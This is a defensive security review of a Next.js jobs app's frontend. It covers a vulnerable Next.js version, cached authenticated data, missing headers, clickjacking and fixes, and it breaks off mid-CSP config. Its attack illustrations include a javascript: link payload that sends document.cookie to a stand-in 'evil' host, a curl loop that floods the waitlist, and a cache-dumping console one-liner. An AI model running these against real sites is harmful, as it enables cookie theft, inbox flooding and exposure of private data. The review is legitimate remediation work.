# 05 — Frontend & Edge Security (apps/web, apps/website)

Authorized whitebox review, read-only. Scope: security headers, XSS, clickjacking, session/cookies,
PWA service worker, redirects, CORS, third-party scripts, client-relevant dependency CVEs.

Repo root: `/Users/jay/Documents/Projects/Agora Jobs`
Reviewed at commit `7167241` (branch `main`).

## Scan result

```
🔍 SECURITY SCAN — 11 finding(s) detected
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[P0] next@15.2.4 vulnerable to CVE-2025-66478 (RSC deserialization RCE, CVSS 10.0)
[P0] Service worker caches authenticated API + document responses; never cleared on sign-out
[P1] Zero security headers on both apps (no CSP/HSTS/XFO/XCTO/Referrer-Policy/Permissions-Policy/COOP/CORP)
[P1] No sign-out control exists anywhere in apps/web
[P2] Both apps are framable — Apply/approve is a one-click state change
[P2] next@15.2.4 also carries CVE-2025-55173 and CVE-2025-57822
[P2] /api/waitlist has no rate limit and no origin check
[P2] tRPC and document-download responses carry no `no-store`
[P3] Scraper-controlled URLs rendered into href / window.open without a scheme guard
[P3] PWA `start_url: /dashboard` — authenticated deep link is the install target
[P3] apps/website inline scripts will require nonces/hashes once CSP lands
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

**Clean areas (verified, no finding):** no `localStorage`/`sessionStorage`/`document.cookie`
anywhere in either app (zero hits across `apps/web/src`, `apps/website/src`) — no token is stored
in JS-readable storage. No custom `Set-Cookie`/`cookies()` usage — Clerk owns 100% of session
state. No CORS headers are set on any route. No open redirect: every `router.push`/`redirect`
target in both apps is a string literal or an internal id, and no `searchParams.get('redirect'|
'next'|'returnTo'|'url')` exists. Every `target="_blank"` carries `rel="noopener noreferrer"`
(`apps/web/src/components/SwipeDeck.tsx:181`, `apps/web/src/components/JobListCard.tsx:69`).
`apps/website` loads **zero** third-party runtime origins — fonts are self-hosted through
`next/font` (`apps/website/src/lib/fonts.ts:1`), employer logos are downloaded at build time
specifically to avoid leaking visitor IPs (`apps/website/scripts/fetch-live-data.mts:28-38`), and
no analytics/tag manager/CDN script is present. That is a genuinely good GDPR posture — the CSP
below is cheap precisely because of it.

---

### [SEV-P0] next@15.2.4 is vulnerable to CVE-2025-66478 — unauthenticated RCE via the RSC Flight protocol

- **File:** `apps/web/package.json:"next": "15.2.4"`, `apps/website/package.json:"next": "15.2.4"`
  (installed tree confirmed: `apps/web/node_modules/next/package.json` → `15.2.4`)
- **Attack:** Attacker POSTs a crafted React Server Component Flight payload to any App Router
  route on either app. The deserializer accepts attacker-injected keys, pollutes `Object.prototype`,
  and steers server-side execution → remote code execution as the Node process, unauthenticated,
  in the default configuration. Both apps use the App Router, so both are in the blast radius. On
  `apps/web` that process holds `DATABASE_URL`, `CLERK_SECRET_KEY`, S3 credentials and the Bedrock
  role.
- **Impact:** Full compromise of the web tier and every secret it holds — i.e. the entire user
  database, including the GDPR-special-category data (CVs, visa status, German level). CVSS 10.0.
  This single finding outranks everything else in this report.
- **Evidence:**
  ```json
  // apps/web/package.json
  "next": "15.2.4",
  "react": "19.1.0",
  "react-dom": "19.1.0",
  ```
  15.2.x is patched in **15.2.6**. 15.2.4 is below the patch line.
- **Fix:**
  ```bash
  # both apps, same major line — no breaking changes within 15.2.x
  pnpm --filter @agora/web  add next@15.2.6
  pnpm --filter @agora/website add next@15.2.6
  # or take the whole line: next@15.5.7 (also patches the two P2 CVEs below)
  ```
  Preferred: go to **15.5.7** in one move — it closes CVE-2025-66478, CVE-2025-55173 and
  CVE-2025-57822 together, and 15.2 → 15.5 is a minor bump with no App Router API breakage for the
  code in this repo (no `next/image` remote config, no custom server, no `unstable_*` APIs in use).
- **References:** [Next.js advisory CVE-2025-66478](https://nextjs.org/blog/CVE-2025-66478),
  [Next.js security update 2025-12-11](https://nextjs.org/blog/security-update-2025-12-11),
  [Datadog: React2Shell / CVE-2025-55182](https://securitylabs.datadoghq.com/articles/cve-2025-55182-react2shell-remote-code-execution-react-server-components/)
  — CWE-502.

---

### [SEV-P0] Service worker caches authenticated API responses and generated CVs into Cache Storage, and nothing clears them on sign-out

- **File:** `apps/web/next.config.js:1-7` (config), `apps/web/public/sw.js` (generated worker,
  `registerRoute` #6 and #7 — `cacheName:"apis"`, `cacheName:"pages"`)
- **Attack:** On a shared or family device (a stated target segment — international students,
  shared flats, university machines):
  1. User A signs in, browses `/dashboard`, opens `/applications/{id}/review`. The tRPC client uses
     `httpBatchLink` with default GET for queries (`apps/web/src/lib/trpc/client.tsx:39`), so
     `GET /api/trpc/profile.get,applications.getWithDocuments...` is a cacheable GET. The review
     screen additionally fetches the generated CV and cover letter over
     `GET /api/download/document?...` (`apps/web/src/server/routers/applications.ts:219-224`).
  2. The generated Workbox rule matches **every same-origin GET under `/api/`** and stores the full
     response body in the `apis` cache for up to 24 hours.
  3. User A closes the tab (there is no sign-out — see the next finding).
  4. User B opens the same browser profile and runs, in DevTools console or from any script on the
     origin: `for (const k of await caches.keys()) for (const r of await (await caches.open(k)).keys()) console.log(r.url, await (await (await caches.open(k)).match(r)).text())`
  5. User B reads A's profile (visa status, German level, hourly-rate floor), A's job matches, and
     the **full text of A's generated CV and cover letter** — name, address, education, employment
     history. No credential needed; Cache Storage is per-origin, not per-user, and survives sign-out
     because nothing deletes it.
- **Impact:** Cross-user disclosure of GDPR Art. 9-adjacent personal data from the local device.
  Also converts any future XSS from "steal a session" into "steal every document the user ever
  generated", and undermines the erasure flow: `gdpr.deleteAccount` wipes the server, but the
  browser keeps a 24h copy of the deleted CVs. That is an Art. 17 gap, not just a hygiene issue.
- **Evidence:**
  ```js
  // apps/web/next.config.js — every default runtimeCaching rule is inherited
  const withPWA = require("@ducanh2912/next-pwa").default({
    dest: "public",
    cacheOnFrontEndNav: true,
    aggressiveFrontEndNavCaching: true,
    reloadOnOnline: true,
    disable: process.env.NODE_ENV === "development",
  })
  ```
  ```js
  // apps/web/public/sw.js (generated, minified) — the two offending rules
  registerRoute(
    ({sameOrigin,url:{pathname}}) => !(!sameOrigin || pathname.startsWith("/api/auth/callback") || !pathname.startsWith("/api/")),
    new NetworkFirst({cacheName:"apis",networkTimeoutSeconds:10,
      plugins:[new ExpirationPlugin({maxEntries:16,maxAgeSeconds:86400})]}), "GET")

  registerRoute(
    ({url:{pathname},sameOrigin}) => sameOrigin && !pathname.startsWith("/api/"),
    new NetworkFirst({cacheName:"pages",
      plugins:[new ExpirationPlugin({maxEntries:32,maxAgeSeconds:86400})]}), "GET")
  ```
  The exclusion list is exactly one path (`/api/auth/callback`) — a Clerk/NextAuth-era default that
  matches nothing in this codebase. `/api/trpc/*` and `/api/download/document` both fall straight
  into the `apis` cache. Workbox's default `cacheWillUpdate` caches any 200 regardless of
  `Cache-Control`, so the `private, max-age=300` on the download route
  (`apps/web/src/app/api/download/document/route.ts:45-48`) does not protect it.
  `skipWaiting`/`clientsClaim` are both on, so the worker takes control immediately.
- **Fix:** Two changes. First, stop caching anything authenticated — replace the inherited defaults
  with an explicit static-asset-only list:
  ```js
  // apps/web/next.config.js
  const withPWA = require("@ducanh2912/next-pwa").default({
    dest: "public",
    reloadOnOnline: true,
    disable: process.env.NODE_ENV === "development",
    // cacheOnFrontEndNav / aggressiveFrontEndNavCaching REMOVED: both exist to cache
    // navigations, and every navigation in this app is authenticated.
    workboxOptions: {
      // Replaces ALL defaults. No /api/ rule, no pages rule, no start-url rule.
      runtimeCaching: [
        {
          urlPattern: /\/_next\/static\/.*/i,
          handler: "CacheFirst",
          options: { cacheName: "next-static", expiration: { maxEntries: 64, maxAgeSeconds: 86400 } },
        },
        {
          urlPattern: /\.(?:js|css|woff2?|png|svg|ico|webp)$/i,
          handler: "StaleWhileRevalidate",
          options: { cacheName: "static-assets", expiration: { maxEntries: 64, maxAgeSeconds: 86400 } },
        },
      ],
      // Never serve a cached shell for an authenticated route.
      navigateFallback: undefined,
    },
  })
  ```
  Second, add the sign-out hook that does not exist yet (see next finding) and make it purge
  storage:
  ```tsx
  // apps/web/src/components/SignOutButton.tsx
  "use client"
  import { useClerk } from "@clerk/nextjs"
  import { Button } from "@agora/ui"

  /** Purge every local copy of this user's data before the session goes away. */
  export async function purgeLocalUserData() {
    if ("caches" in window) {
      await Promise.all((await caches.keys()).map((k) => caches.delete(k)))
    }
    if ("serviceWorker" in navigator) {
      const regs = await navigator.serviceWorker.getRegistrations()
      await Promise.all(regs.map((r) => r.unregister()))
    }
  }

  export function SignOutButton() {
    const { signOut } = useClerk()
    return (
      <Button
        variant="outline"
        onClick={async () => {
          await purgeLocalUserData()
          await signOut({ redirectUrl: "/" })
        }}
      >
        Sign out
      </Button>
    )
  }
  ```
  Call `await purgeLocalUserData()` in the account-erasure success handler too
  (`apps/web/src/app/(screens)/settings/page.tsx:22`, before `window.location.assign("/")`).
  Regression test to keep it fixed:
  ```ts
  // apps/web/tests/sw-cache.test.ts
  import { readFileSync } from "node:fs"
  import { expect, it } from "vitest"
  it("service worker never caches /api/ or navigations", () => {
    const sw = readFileSync("public/sw.js", "utf8")
    expect(sw).not.toContain('cacheName:"apis"')
    expect(sw).not.toContain('cacheName:"pages"')
  })
  ```
- **References:** OWASP ASVS V8.2.1 (no sensitive data in client-side storage), CWE-524
  (Use of Cache Containing Sensitive Information), CWE-539.

---

### [SEV-P1] No security headers are set anywhere — no CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, COOP or CORP

- **File:** `apps/web/next.config.js:9-13`, `apps/website/next.config.js:1-6`,
  `infrastructure/vercel.json:1-7`
- **Attack:** No single attack — this is the missing floor under every other finding. Concretely:
  (a) any injected `<script>` or `<img src=x onerror=...>` executes with no CSP to stop it and can
  exfiltrate to any host; (b) a user on hotel Wi-Fi hitting `http://agora…` before the redirect has
  their session cookie stripped in flight (no HSTS, no preload); (c) both apps can be framed
  (see next finding); (d) an uploaded/proxied document served with a wrong `Content-Type` can be
  MIME-sniffed into HTML on the app origin (no `nosniff`, and
  `/api/download/document` returns attacker-influencable Markdown from S3); (e) full referrer URLs —
  which include `applicationId` — leak to every employer site the user clicks through to, from
  `SwipeDeck`, `JobListCard` and the submit page.
- **Impact:** No defense-in-depth on either app. For a GDPR-first product handling CVs and visa
  status, "we have no CSP and no HSTS" is also an Art. 32 ("state of the art" technical measures)
  problem in a DPA review, independent of any actual exploit.
- **Evidence:**
  ```js
  // apps/web/next.config.js — the entire config; no headers()
  const nextConfig = {
    reactStrictMode: true,
    transpilePackages: ["@agora/ui", "@agora/db", "@agora/ai", "@agora/legal"],
  }
  ```
  ```js
  // apps/website/next.config.js — the entire config
  const nextConfig = { reactStrictMode: true }
  ```
  ```json
  // infrastructure/vercel.json — no "headers" key
  { "framework": "nextjs", "rootDirectory": "apps/web",
    "buildCommand": "cd ../.. && pnpm turbo build --filter=@agora/web",
    "installCommand": "pnpm install --frozen-lockfile", "regions": ["fra1"] }
  ```
  `grep -rn "async headers|X-Frame-Options|Strict-Transport" apps/ infrastructure/` → **zero hits.**
- **Fix:** See **Ready-to-paste security headers config** below. Note on Clerk: the installed
  `@clerk/nextjs` is **6.12.12** (`apps/web/package.json`), and Clerk's built-in
  `clerkMiddleware({ contentSecurityPolicy })` requires **>= 6.14.0** — so the option is **not
  available on the installed version**. Either upgrade Clerk to ≥ 6.14 and use the one-line
  built-in, or ship the hand-written CSP below. Both variants are given.
- **References:** OWASP Secure Headers Project; CWE-693 (Protection Mechanism Failure), CWE-1021.

---

### [SEV-P1] There is no sign-out control anywhere in apps/web

- **File:** `apps/web/src/app/(screens)/layout.tsx:1-18`, `apps/web/src/components/Sidebar.tsx`,
  `apps/web/src/components/BottomNav.tsx`, `apps/web/src/app/(screens)/settings/page.tsx`
- **Attack:** User signs in on a university library PC, finishes, closes the tab. The Clerk session
  cookie persists (Clerk default: 7-day rolling session). The next person opens the browser, hits
  `/dashboard`, and is user A — full read of profile, matches, generated CVs, tracker, and full
  write access (approve documents, mark applications submitted, and `gdpr.deleteAccount`, which is
  irreversible). Combined with the P0 above, even a manual cookie clear does not remove the cached
  copies.
- **Impact:** Complete account takeover on any shared device, no skill required. For the target
  demographic (international students, shared accommodation, campus machines) this is the single
  most likely real-world incident in this report.
- **Evidence:**
  ```
  $ grep -rni "sign.out|logout|log out|useClerk|SignOutButton" apps/web/src
  (no matches)
  ```
  The only session-terminating path in the app is account **deletion**:
  ```tsx
  // apps/web/src/app/(screens)/settings/page.tsx:20-23
  const deleteAccount = trpc.gdpr.deleteAccount.useMutation({
    // Clerk session is gone after erasure — a hard navigation resets everything.
    onSuccess: () => window.location.assign("/"),
  })
  ```
- **Fix:** Add the `SignOutButton` from the P0 fix above to the sidebar and the settings screen —
  it already purges Cache Storage and unregisters the worker before `signOut()`:
  ```tsx
  // apps/web/src/components/Sidebar.tsx — inside the rail, below the nav items
  import { SignOutButton } from "@/components/SignOutButton"
  ...
  <div className="mt-auto p-4"><SignOutButton /></div>
  ```
  Also shorten the session in the Clerk Dashboard (Sessions → inactivity timeout): 7-day rolling is
  wrong for a shared-device product; 24h inactivity + 7d absolute is a sane pair. `signOut()` calls
  Clerk's server-side revocation endpoint, so the session is invalidated at the IdP, not just
  locally — that part is correct once the button exists.
- **References:** OWASP ASVS V3.3 (session termination), CWE-613.

---

### [SEV-P2] Both apps can be framed — the approve / "I submitted it" flow is a one-click state change

- **File:** `apps/web/src/app/(screens)/applications/[id]/review/page.tsx:127-140` (Approve),
  `apps/web/src/app/(screens)/applications/[id]/submit/page.tsx:155-166` (mark submitted);
  no `X-Frame-Options` / `frame-ancestors` in either config
- **Attack:** `evil.example` embeds `https://app.agora…/applications/{id}/review` in a
  0-opacity iframe positioned under a "Continue" button. A logged-in visitor clicks; the click lands
  on **Approve — I'm happy with this**, or on the submit screen's *I submitted it on the employer's
  site*, which flips the application to submitted and schedules a day-10 follow-up draft.
- **Impact:** Data-integrity corruption of the applications pipeline and false submission receipts —
  which matters more than usual for a product whose entire legal posture (Mode 1, user-submits)
  rests on those receipts being truthful. **Honest assessment of exploitability:** Clerk's session
  cookie is `SameSite=Lax`, so a cross-site framed document is very likely to load *unauthenticated*
  and the clickjack fails. That dampens it to P2 rather than P1 — but SameSite is a cookie-policy
  side effect, not a framing control, it varies by browser and by future Clerk config
  (`SameSite=None` is required for some embedded/satellite-domain setups), and it does nothing about
  framing `apps/website` for phishing overlays. Ship the header.
- **Evidence:** No `X-Frame-Options` and no `frame-ancestors` directive exists in
  `apps/web/next.config.js`, `apps/website/next.config.js`, `infrastructure/vercel.json`, or
  `apps/web/src/middleware.ts`. Framing is currently permitted by default.
- **Fix:** `frame-ancestors 'none'` in the CSP plus `X-Frame-Options: DENY` for old agents — both
  are in the ready-to-paste block below. Nothing in either app is meant to be embedded, so there is
  no allowlist to maintain.
- **References:** OWASP Clickjacking Defense Cheat Sheet; CWE-1021.

---

### [SEV-P2] next@15.2.4 also carries CVE-2025-55173 (image content injection) and CVE-2025-57822 (middleware SSRF)

- **File:** `apps/web/package.json`, `apps/website/package.json`
- **Attack:** CVE-2025-55173 — an attacker-controlled image source routed through
  `/_next/image` triggers a download with attacker-chosen content and filename (fixed 15.4.5).
  CVE-2025-57822 — `NextResponse.next()` called without forwarding the request object in middleware
  lets an attacker steer a server-side fetch (SSRF), fixed 15.4.7, self-hosted deployments.
- **Impact:** Both are **currently low-reachability here**, and I am saying so rather than inflating
  them: `apps/web/next.config.js` declares no `images.remotePatterns`/`domains`, so the optimizer
  will not fetch remote origins; `apps/website` only ever passes local `/img/*` paths to
  `next/image` (`grep 'src="http' apps/website/src` → no hits); and the deployment target is Vercel
  (`infrastructure/vercel.json`), not self-hosted, which is where CVE-2025-57822 bites. The reason
  they are listed is that both become live the moment someone adds an employer-logo remote pattern
  or moves to Railway/self-host — and the fix is the same upgrade already required by the P0.
- **Evidence:** installed `next` = `15.2.4`; patch lines are 15.4.5 and 15.4.7 respectively.
- **Fix:** Covered by upgrading to `next@15.5.7` (see P0). If you stay on 15.2.6, keep
  `images.remotePatterns` empty and keep the Vercel target; revisit before either changes.
- **References:** [Next.js security update](https://nextjs.org/blog/security-update-2025-12-11),
  [GitLab advisory DB — next](https://advisories.gitlab.com/pkg/npm/next/CVE-2025-49826/).
  For completeness: CVE-2025-29927 (middleware auth bypass via `x-middleware-subrequest`) is patched
  in 15.2.3 — **15.2.4 is not vulnerable to it.** CVE-2025-49826 (cache poisoning, fixed 15.1.8) —
  also not vulnerable.

---

### [SEV-P2] /api/waitlist has no rate limit and no origin check

- **File:** `apps/website/src/app/api/waitlist/route.ts:6-24`
- **Attack:** `for i in $(seq 100000); do curl -s -XPOST https://agora…/api/waitlist -H 'content-type: application/json' -d "{\"email\":\"victim+$i@gmail.com\"}"; done`. Every request is
  forwarded to `WAITLIST_WEBHOOK_URL` (`apps/website/src/lib/waitlist.ts`). A cross-origin browser
  POST is blocked by preflight (no CORS headers — correct), but nothing stops a script or a
  server-side loop.
- **Impact:** Unbounded third-party webhook spend, list poisoning, and — the part that actually
  hurts — mail-bombing an arbitrary victim's inbox with "welcome to Agora" mail from your domain,
  i.e. processing personal data of people who never consented (GDPR Art. 6) and a fast route to a
  domain reputation problem before launch.
- **Evidence:**
  ```ts
  export async function POST(req: Request) {
    let email: unknown
    try { ;({ email } = await req.json()) } catch { ... }
    if (typeof email !== "string" || email.length > 254 || !EMAIL_RE.test(email)) { ... }
    const result = await saveWaitlistEmail(email.trim().toLowerCase())
  ```
  Validation is present and decent; throttling and origin checking are absent.
- **Fix:** No new dependency needed — an in-memory IP bucket is enough for a single-region
  marketing site, plus a same-origin check:
  ```ts
  // apps/website/src/app/api/waitlist/route.ts
  // ponytail: in-memory bucket, resets on cold start. Move to Upstash/KV if the site
  // ever runs on more than one instance.
  const hits = new Map<string, { n: number; until: number }>()
  function rateLimited(ip: string, max = 5, windowMs = 60_000) {
    const now = Date.now()
    const e = hits.get(ip)
    if (!e || e.until < now) { hits.set(ip, { n: 1, until: now + windowMs }); return false }
    e.n += 1
    return e.n > max
  }

  export async function POST(req: Request) {
    const origin = req.headers.get("origin")
    const site = process.env.NEXT_PUBLIC_SITE_URL
    if (origin && site && origin !== site) {
      return NextResponse.json({ ok: false, error: "bad_origin" }, { status: 403 })
    }
    const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ?? "unknown"
    if (rateLimited(ip)) {
      return NextResponse.json({ ok: false, error: "rate_limited" }, { status: 429 })
    }
    // …existing validation unchanged
  }
  ```
- **References:** OWASP API Security Top 10 API4:2023 (Unrestricted Resource Consumption); CWE-770.

---

### [SEV-P2] Authenticated responses carry no `Cache-Control: no-store`

- **File:** `apps/web/src/app/api/trpc/[trpc]/route.ts:5-13` (no headers at all),
  `apps/web/src/app/api/download/document/route.ts:44-49` (`private, max-age=300`)
- **Attack:** Any intermediary that respects HTTP caching (a corporate proxy, a future CDN rule, a
  browser back/forward cache) may retain a per-user tRPC response. `private, max-age=300` on the
  document route means the browser's HTTP cache keeps user A's CV on disk for 5 minutes after
  sign-out, independent of the service worker.
- **Impact:** Second, independent copy of the same data exposed in the P0 finding. Cheap to close.
- **Evidence:**
  ```ts
  // apps/web/src/app/api/trpc/[trpc]/route.ts — no response headers set
  const handler = (req: Request) =>
    fetchRequestHandler({ endpoint: "/api/trpc", req, router: appRouter,
      createContext: () => createTRPCContext({ headers: req.headers }) })
  ```
- **Fix:**
  ```ts
  // apps/web/src/app/api/trpc/[trpc]/route.ts
  const handler = async (req: Request) => {
    const res = await fetchRequestHandler({
      endpoint: "/api/trpc", req, router: appRouter,
      createContext: () => createTRPCContext({ headers: req.headers }),
    })
    res.headers.set("Cache-Control", "no-store, private")
    return res
  }
  ```
  ```ts
  // apps/web/src/app/api/download/document/route.ts:44-49
  return new Response(buffer, {
    headers: {
      "Content-Type": "text/markdown; charset=utf-8",
      "Content-Disposition": "attachment",           // never render in-origin
      "X-Content-Type-Options": "nosniff",
      "Cache-Control": "no-store, private",
    },
  })
  ```
- **References:** OWASP ASVS V8.1.2; CWE-525.

---

### [SEV-P3] Scraper-controlled URLs reach `href` and `window.open` with no scheme guard at the render boundary

- **File:** `apps/web/src/components/SwipeDeck.tsx:179-181`,
  `apps/web/src/components/JobListCard.tsx:67-69`,
  `apps/web/src/app/(screens)/applications/[id]/submit/page.tsx:87-91`
- **Attack:** A job row whose `sourceUrl` is `javascript:fetch('https://evil/?d='+document.cookie)`
  renders as the "View original posting" / "Open employer page" link. One user click executes script
  in the Agora origin with an authenticated session — full read/write of that user's account through
  tRPC.
- **Impact:** Stored-XSS-equivalent, triggered by a normal user action. **Currently not reachable**
  through the scraper path: ingestion enforces the scheme —
  `apps/workers/src/scrapers/normalizer.ts:85` → `if (!sourceUrl || !/^https?:\/\//i.test(sourceUrl)) return null`, with a test covering it (`apps/workers/tests/normalizer.test.ts:72-84`). The finding
  stands because that is a single upstream check on a value that eight files downstream trust
  implicitly, and `apps/workers/src/seed-jobs.ts:192` calls `saveJobs()` directly without going
  through `normalizeJob`. The moment a new source, an admin tool, or a partner feed writes `jobs`
  without the normalizer, this becomes live.
- **Evidence:**
  ```tsx
  // apps/web/src/components/SwipeDeck.tsx:178-182
  <a href={card.sourceUrl} target="_blank" rel="noopener noreferrer" ...>
  ```
  ```tsx
  // apps/web/src/app/(screens)/applications/[id]/submit/page.tsx:87-91
  function openEmployerPage() {
    if (data?.employerUrl) { window.open(data.employerUrl, "_blank", "noopener,noreferrer") ... }
  }
  ```
- **Fix:** One shared helper, used by all three call sites — the lazy fix is also the root-cause fix,
  since every caller routes through it:
  ```ts
  // packages/ui/src/safe-url.ts  (or apps/web/src/lib/safe-url.ts)
  /** Returns the URL only if it is http(s). Anything else — javascript:, data:, vbscript: — is dropped. */
  export function safeHttpUrl(url: string | null | undefined): string | null {
    if (!url) return null
    try {
      const u = new URL(url)
      return u.protocol === "https:" || u.protocol === "http:" ? u.toString() : null
    } catch {
      return null
    }
  }

  // self-check
  if (import.meta.vitest) {
    const { it, expect } = import.meta.vitest
    it("drops non-http schemes", () => {
      expect(safeHttpUrl("javascript:alert(1)")).toBeNull()
      expect(safeHttpUrl("data:text/html,<script>")).toBeNull()
      expect(safeHttpUrl("https://x.de/job")).toBe("https://x.de/job")
    })
  }
  ```
  Then `href={safeHttpUrl(card.sourceUrl) ?? "#"}` and
  `const target = safeHttpUrl(data.employerUrl); if (target) window.open(target, "_blank", "noopener,noreferrer")`.
  The CSP below (`default-src 'self'`, no `unsafe-inline` in `script-src`) blocks `javascript:` URLs
  as a second layer.
- **References:** OWASP XSS Prevention Cheat Sheet (URL contexts); CWE-79, CWE-83.

---

### [SEV-P3] PWA `start_url` points at an authenticated route

- **File:** `apps/web/public/manifest.json:5` → `"start_url": "/dashboard"`
- **Attack / impact:** Minor, but it compounds the P0: the installed app's launch target is an
  authenticated screen, which is exactly the URL the `pages` runtime cache and `start-url` cache are
  designed to keep warm. Launching the installed PWA offline on a shared device serves the cached
  authenticated shell. Once the runtime caching fix above lands, the residual issue is only that an
  uninstalled/signed-out launch bounces through `auth.protect()` — cosmetic.
- **Evidence:** `"start_url": "/dashboard"`, and the generated worker registers
  `registerRoute("/", new NetworkFirst({cacheName:"start-url", ...}))`.
- **Fix:** `"start_url": "/"` and let the middleware route signed-in users onward; the
  `NEXT_PUBLIC_CLERK_AFTER_SIGN_IN_URL=/dashboard` env already handles the signed-in case.
- **References:** CWE-524 (contributing).

---

### [SEV-P3] apps/website inline scripts must be nonced or hashed before CSP can drop `unsafe-inline`

- **File:** `apps/website/src/app/layout.tsx:53` (pre-paint motion flag), `:66-70` (JSON-LD)
- **Attack / impact:** Not a vulnerability today — both blocks are static strings with no user
  input, and both carry an accurate biome-ignore justification. It is listed because it is the one
  thing that will make the CSP rollout below fail loudly (blank page, missing structured data) if
  handled carelessly, and because "add `'unsafe-inline'` to make it work" is the tempting wrong fix.
- **Evidence:**
  ```tsx
  const motionFlag = `try{if(matchMedia('(prefers-reduced-motion: no-preference)').matches)document.documentElement.classList.add('js-motion')}catch(e){}`
  <script dangerouslySetInnerHTML={{ __html: motionFlag }} />
  ...
  <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(organizationLd) }} />
  ```
  Nonces are not the right tool here: per Next.js docs, a nonce-based CSP **forces dynamic
  rendering** of every page that needs it — which would throw away the marketing site's static
  generation for two constant scripts.
- **Fix:** Move the motion flag to a static file and hash the JSON-LD.
  ```tsx
  // apps/website/src/app/layout.tsx — replace the inline motion script
  <script src="/motion-flag.js" />          // apps/website/public/motion-flag.js, same one line
  ```
  For the JSON-LD block, compute its hash once and pin it in the CSP:
  ```bash
  # run from apps/website; re-run whenever organizationLd changes
  node -e 'const c=require("node:crypto");const s=JSON.stringify({"@context":"https://schema.org","@type":"Organization",name:"Agora",description:process.argv[1],url:process.argv[2],areaServed:"Berlin, Germany"});console.log("sha256-"+c.createHash("sha256").update(s).digest("base64"))'
  ```
  Simpler and drift-proof: drop the `<script type="application/ld+json">` element and return the
  same object from Next's metadata/route-level JSON-LD, or serve it from
  `apps/website/public/organization.jsonld` referenced by `<link rel="alternate" type="application/ld+json">`.
  Until that lands, the website CSP below keeps `'unsafe-inline'` in `script-src` **and is marked
  as such** — do not consider the website CSP finished while that string is present.
- **References:** [Next.js CSP guide](https://nextjs.org/docs/app/guides/content-security-policy);
  CWE-1021 (contributing).

---

## Ready-to-paste security headers config

Every origin below was verified against code in this repo. Origins that are *not* here were checked
and deliberately excluded — see the justification table.

### Origin justification (grepped, not guessed)

| Origin | Directive | Why it is in the policy |
|---|---|---|
| `'self'` | all | Both apps serve every asset from their own origin. |
| `https://*.clerk.accounts.dev` | `script-src`, `connect-src`, `img-src`, `worker-src` | `apps/web` uses `<ClerkProvider>` (`src/app/layout.tsx:1`) with `<SignIn/>`/`<SignUp/>` (`src/app/sign-in/[[...sign-in]]/page.tsx:1`). `.env.example` shows `pk_test_…`, i.e. a **development** instance, whose Frontend API is a `*.clerk.accounts.dev` host that serves `clerk.browser.js`. |
| `https://clerk.${DOMAIN}` (via `NEXT_PUBLIC_CLERK_FAPI`) | same as above | The production instance serves clerk-js from `clerk.<your-domain>`, not from `accounts.dev`. Must be env-driven — do not hardcode a domain you do not own yet. |
| `https://img.clerk.com` | `img-src` | Avatar/profile images rendered by Clerk's `<SignIn/>`, `<SignUp/>` and any future `<UserButton/>`. |
| `https://challenges.cloudflare.com`, `https://*.protect.clerk.com` | `frame-src`, `script-src`, `connect-src` | Clerk's bot/abuse protection (Turnstile) is injected into the sign-in flow; omitting them breaks sign-up on any instance with bot protection enabled. Per Clerk's CSP guide. |
| `blob:` | `worker-src` | `@ducanh2912/next-pwa` registers the generated service worker; Clerk also uses blob workers. Verified: `apps/web/public/sw.js` + `swe-worker-*.js` exist. |
| `data:` | `img-src` | Next.js inlines small images and blur placeholders as data URIs. |
| **Excluded:** `js.stripe.com`, `api.stripe.com`, `*.stripe.com` frames | — | **Stripe.js is not loaded anywhere on the client.** `grep -rni stripe apps/web/src --include='*.tsx'` → zero client hits; billing is server-side only (`apps/web/src/server/routers/billing.ts:97` creates a Checkout Session and the user is sent to `checkout.stripe.com` as a **top-level navigation**, which CSP does not gate). Add `script-src https://js.stripe.com; frame-src https://js.stripe.com https://hooks.stripe.com; connect-src https://api.stripe.com` **only when** Elements or the embedded Checkout ships. |
| **Excluded:** `https://s3.fr-par.scw.cloud` | — | The browser never talks to S3. Documents are proxied same-origin through `/api/download/document` (`apps/web/src/server/routers/applications.ts:219-224`). If you ever switch back to presigned URLs, add it to `connect-src`. |
| **Excluded:** Vercel Analytics / Speed Insights (`va.vercel-scripts.com`) | — | `@vercel/analytics` is in **neither** `package.json`. Not loaded, not allowed. |
| **Excluded:** Google Fonts | — | Both apps self-host through `next/font` (`apps/website/src/lib/fonts.ts:13`, "no external request at runtime"). The stale `fonts.gstatic.com` rule in the generated `sw.js` is a next-pwa default, not a real dependency, and disappears with the runtimeCaching fix. |

### A. `apps/web` — Clerk + PWA (hand-written CSP; works on the installed @clerk/nextjs 6.12.12)

```js
// apps/web/next.config.js
const withPWA = require("@ducanh2912/next-pwa").default({
  dest: "public",
  reloadOnOnline: true,
  disable: process.env.NODE_ENV === "development",
  workboxOptions: {
    // See finding P0 #2 — never cache /api/ or navigations.
    runtimeCaching: [
      {
        urlPattern: /\/_next\/static\/.*/i,
        handler: "CacheFirst",
        options: { cacheName: "next-static", expiration: { maxEntries: 64, maxAgeSeconds: 86400 } },
      },
      {
        urlPattern: /\.(?:js|css|woff2?|png|svg|ico|webp)$/i,
        handler: "StaleWhileRevalidate",
        options: { cacheName: "static-assets", expiration: { maxEntries: 64, maxAgeSeconds: 86400 } },
      },
    ],
    navigateFallback: undefined,
  },
})

const isProd = process.env.NODE_ENV === "production"

// Clerk Frontend API host. Dev instances are *.clerk.accounts.dev; production is
// clerk.<your-domain>. Set NEXT_PUBLIC_CLERK_FAPI in Vercel for prod — never hardcode.
const CLERK_FAPI = process.env.NEXT_PUBLIC_CLERK_FAPI ?? "https://*.clerk.accounts.dev"

const csp = [
  "default-src 'self'",
  // 'unsafe-inline' is required by Next.js's inline bootstrap/flight scripts in the App
  // Router without a per-request nonce; 'unsafe-eval' is dev-only (React Refresh).
  `script-src 'self' 'unsafe-inline' ${isProd ? "" : "'unsafe-eval'"} ${CLERK_FAPI} https://*.clerk.accounts.dev https://challenges.cloudflare.com https://*.protect.clerk.com`,
  // Tailwind + framer-motion write inline style attributes on animated elements.
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: blob: https://img.clerk.com",
  "font-src 'self' data:",
  `connect-src 'self' ${CLERK_FAPI} https://*.clerk.accounts.dev https://*.protect.clerk.com`,
  "worker-src 'self' blob:",
